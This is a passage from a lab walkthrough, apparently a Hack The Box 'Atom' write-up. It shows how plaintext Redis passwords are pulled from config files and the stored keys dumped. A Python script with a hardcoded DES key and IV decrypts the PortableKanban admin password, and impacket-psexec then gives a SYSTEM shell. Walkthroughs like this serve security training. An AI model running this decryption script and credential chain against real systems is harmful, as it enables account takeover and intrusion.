type PortableKanban\PortableKanban.cfg
{&#34;RoamingSettings&#34;:{&#34;DataSource&#34;:&#34;RedisServer&#34;,&#34;DbServer&#34;:&#34;localhost&#34;,&#34;DbPort&#34;:6379,&#34;DbEncPassword&#34;:&#34;Odh7N3L9aVSeHQmgK/nj7RQL8MEYCUMb&#34;
...&lt;SNIP&gt;...
</code></pre></div><h4 id="redis-revisited">Redis Revisited</h4>
<p>Looking into the Redis installation folder, I find a plain password in <code>redis.windows.conf</code> file.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-text" data-lang="text">C:\Program Files\Redis&gt;type redis.windows.conf | findstr requirepass
type redis.windows.conf | findstr requirepass
requirepass kidvscat_yes_kidvscat
</code></pre></div><p><code>redis.windows-service.conf</code> also contains the same password.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-text" data-lang="text">C:\Program Files\Redis&gt;type redis.windows-service.conf | findstr requirepass
type redis.windows-service.conf | findstr requirepass
requirepass kidvscat_yes_kidvscat
</code></pre></div><p>The password <code>kidvscat_yes_kidvscat</code> works on Redis.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell">→ root@kali «atom» «10.10.14.49» 
$ rlwrap nc -nv 10.10.10.237 <span class="m">6379</span>
<span class="o">(</span>UNKNOWN<span class="o">)</span> <span class="o">[</span>10.10.10.237<span class="o">]</span> <span class="m">6379</span> <span class="o">(</span>redis<span class="o">)</span> open
AUTH jason kidvscat_electron_@123
-ERR wrong number of arguments <span class="k">for</span> <span class="s1">&#39;auth&#39;</span> <span class="nb">command</span>
AUTH kidvscat_electron_@123
-ERR invalid password
AUTH kidvscat_yes_kidvscat
+OK
</code></pre></div><p>It&rsquo;s possible to dump the database that is currently in use.</p>
<p>To do that, I&rsquo;ll send <code>INFO</code> command and starting to look for a chunk called <code>Keyspace</code> .</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-text" data-lang="text">INFO
$1938
# Server
redis_version:3.0.504
...&lt;SNIP&gt;...
# Keyspace
db0:keys=4,expires=0,avg_ttl=0
</code></pre></div><p>There is one database active, which is <code>db0</code> and it contains 4 keys.</p>
<p>I&rsquo;ll send <code>KEYS *</code> command to get all the stored keys.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-text" data-lang="text">SELECT 0
+OK
KEYS *
*4
$48
pk:urn:user:e8e29158-d70d-44b1-a1ba-4949d52790a0
$11
pk:ids:User
$20
pk:ids:MetaDataClass
$57
pk:urn:metadataclass:ffffffff-ffff-ffff-ffff-ffffffffffff
</code></pre></div><p>The value of <code>pk:urn:user:e8e29158-d70d-44b1-a1ba-4949d52790a0</code> contains a credentials of the Administrator account, but the password is encrypted.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-text" data-lang="text">GET pk:urn:user:e8e29158-d70d-44b1-a1ba-4949d52790a0
$207
{&#34;Id&#34;:&#34;e8e29158d70d44b1a1ba4949d52790a0&#34;,&#34;Name&#34;:&#34;Administrator&#34;,&#34;Initials&#34;:&#34;&#34;,&#34;Email&#34;:&#34;&#34;,&#34;EncryptedPassword&#34;:&#34;Odh7N3L9aVQ8/srdZgG2hIR0SSJoJKGi&#34;,&#34;Role&#34;:&#34;Admin&#34;,&#34;Inactive&#34;:false,&#34;TimeStamp&#34;:637530169606440253}
</code></pre></div><h4 id="portablekanban-decrypt">PortableKanban Decrypt</h4>
<p>By assuming that the password is encrypted using PortableKanban, I could try to decrypt the password I obtained using the following <a href="https://github.com/fahmifj/PortableKanban-decrypt/blob/main/pk-decrypt.py">script</a>  (a modified version of the original exploit).</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell">from base64 import b64decode
import sys
import des 

<span class="nv">key</span> <span class="o">=</span> des.DesKey<span class="o">(</span>b<span class="s1">&#39;7ly6UznJ&#39;</span><span class="o">)</span>
<span class="nv">iv</span> <span class="o">=</span> b<span class="s1">&#39;XuVUm5fR&#39;</span>

try:    
	<span class="nv">passwd</span> <span class="o">=</span> b64decode<span class="o">(</span>sys.argv<span class="o">[</span>1<span class="o">]</span>.encode<span class="o">(</span><span class="s1">&#39;UTF-8&#39;</span><span class="o">))</span>
except IndexError:
	print<span class="o">(</span><span class="s1">&#39;[-] Usage: %s &lt;base64_encrypted_passwd&gt;&#39;</span> % sys.argv<span class="o">[</span>0<span class="o">])</span>
    
	sys.exit<span class="o">(</span>-1<span class="o">)</span>

<span class="nv">dec_password</span> <span class="o">=</span> key.decrypt<span class="o">(</span>passwd, <span class="nv">initial</span><span class="o">=</span>iv, <span class="nv">padding</span><span class="o">=</span>True<span class="o">)</span>
print<span class="o">(</span><span class="s2">&#34;[+] Decrypted Password: &#34;</span> + dec_password.decode<span class="o">(</span><span class="s1">&#39;UTF-8&#39;</span><span class="o">))</span>
</code></pre></div><p>The administrator password has been decrypted to <code>kidvscat_admin_@123</code>.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell">→ kali@kali «atom» «10.10.14.83»
$ python3 pk-decrypt.py Odh7N3L9aVQ8/srdZgG2hIR0SSJoJKGi
<span class="o">[</span>+<span class="o">]</span> Decrypted Password: kidvscat_admin_@123
</code></pre></div><h4 id="psexecpy">psexec.py</h4>
<p>I could use the credentials in psexec from impacket to obtain interactive shell access as system.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell">→ root@kali «atom» «10.10.14.49» 
$ impacket-psexec atom/administrator:<span class="s1">&#39;kidvscat_admin_@123&#39;</span>@10.10.10.237
Impacket v0.9.22 - Copyright <span class="m">2020</span> SecureAuth Corporation

<span class="o">[</span>*<span class="o">]</span> Requesting shares on 10.10.10.237.....
<span class="o">[</span>*<span class="o">]</span> Found writable share ADMIN$
<span class="o">[</span>*<span class="o">]</span> Uploading file FCSITnEj.exe
<span class="o">[</span>*<span class="o">]</span> Opening SVCManager on 10.10.10.237.....
<span class="o">[</span>*<span class="o">]</span> Creating service DCLl on 10.10.10.237.....
<span class="o">[</span>*<span class="o">]</span> Starting service DCLl.....
<span class="o">[</span>!<span class="o">]</span> Press <span class="nb">help</span> <span class="k">for</span> extra shell commands
Microsoft Windows <span class="o">[</span>Version 10.0.19042.906<span class="o">]</span>
<span class="o">(</span>c<span class="o">)</span> Microsoft Corporation. All rights reserved.

C:<span class="se">\W</span>INDOWS<span class="se">\s</span>ystem32&gt;whoami <span class="o">&amp;&amp;</span> hostname
nt authority<span class="se">\s</span>ystem
ATOM

C:<span class="se">\W</span>INDOWS<span class="se">\s</span>ystem32&gt;ipconfig

Windows IP Configuration


Ethernet adapter Ethernet0:

   Connection-specific DNS Suffix  . :
   IPv6 Address. . . . . . . . . . . : dead:beef::525:3f10:5c90:26bf
   Temporary IPv6 Address. . . . . . : dead:beef::cc8a:70e1:ba06:84ed
   Link-local IPv6 Address . . . . . : fe80::525:3f10:5c90:26bf%6
   IPv4 Address. . . . . . . . . . . : 10.10.10.237
   Subnet Mask . . . . . . . . . . . : 255.255.255.0
   Default Gateway . . . . . . . . . : fe80::250:56ff:feb9:271c%6
                                       10.10.10.2
</code></pre></div><hr>
<h2 id="references">Reference(s)</h2>
<ul>
<li><a href="https://blog.doyensec.com/2020/02/24/electron-updater-update-signature-bypass.html">https://blog.doyensec.com/2020/02/24/electron-updater-update-signature-bypass.html</a></li>
<li><a href="https://book.hacktricks.xyz/pentesting/6379-pentesting-redis">https://book.hacktricks.xyz/pentesting/6379-pentesting-redis</a></li>
<li><a href="https://www.exploit-db.com/exploits/49409">https://www.exploit-db.com/exploits/49409</a></li>
</ul>
]]></content:encoded>
    </item>
    
  </channel>
</rss>
